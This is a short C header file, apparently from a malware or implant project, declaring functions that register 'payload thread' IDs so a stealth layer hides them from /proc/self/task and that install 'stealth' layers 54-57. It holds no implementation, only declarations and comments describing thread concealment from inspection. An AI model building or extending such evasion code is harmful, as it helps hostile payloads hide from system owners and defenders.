#pragma once
#include <sys/types.h>

// Register a payload thread TID so Layer 54 hides it from /proc/self/task enumeration.
// Call from each thread we create (ctrl_loop, etc.) as its FIRST action.
void zx_register_tid(pid_t tid);

// Install Layers 54-57
void install_stealth_ext7();
